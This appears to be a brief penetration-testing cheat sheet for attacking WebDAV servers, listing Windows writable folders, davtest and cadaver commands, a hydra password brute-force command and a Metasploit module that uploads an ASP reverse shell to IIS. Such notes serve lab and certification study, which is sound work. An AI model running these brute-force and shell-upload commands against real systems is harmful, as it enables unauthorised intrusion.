
# Windows writable folders


```
C:\Windows\Temp
C:\Program data
```


# Davtest


```bash

davtest -url http://IP

davtest -auth USER:PASS -url http://IP

```


# cadaver

```bash
cadaver http://WEBSITE/webdav/
```



# Brute force
```bash

hydra -L WORDLIST -P WORDLIST IP http-get /webdav/

```


# Metasploit

```ruby


use exploit/windows/iis/iis_webdav_upload_asp # upload rev shell 

set PATH /webdav/metasploit.asp

```